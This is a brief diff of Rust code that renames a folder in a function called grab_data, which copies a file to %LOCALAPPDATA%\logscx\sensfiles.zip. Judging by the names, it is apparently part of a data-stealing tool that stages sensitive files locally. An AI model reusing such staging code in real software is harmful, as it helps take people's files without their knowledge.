@@ -91,7 +91,7 @@ pub fn grab_data() -> Option<String> {
             std::fs::copy(
                 filename,
                 format!(
-                    "{}\\logsxc\\sensfiles.zip",
+                    "{}\\logscx\\sensfiles.zip",
                     &std::env::var("LOCALAPPDATA").unwrap()
                 ),
             )
